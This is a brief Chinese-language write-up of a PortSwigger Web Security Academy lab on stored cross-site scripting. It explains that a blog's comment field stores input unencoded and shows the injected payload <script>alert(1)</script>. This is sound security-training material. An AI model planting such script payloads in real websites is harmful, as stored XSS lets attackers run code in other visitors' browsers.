---
description: >-
  https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
---

# Lab: Stored XSS into HTML context with nothing encoded

### 思路

实验很明确地告诉我们博客文章的评论处存在存储型跨站脚本，并且是没有任何过滤的，所以我们直接去到评论处插入Payload即可。

```
<script>alert(1)</script>
```
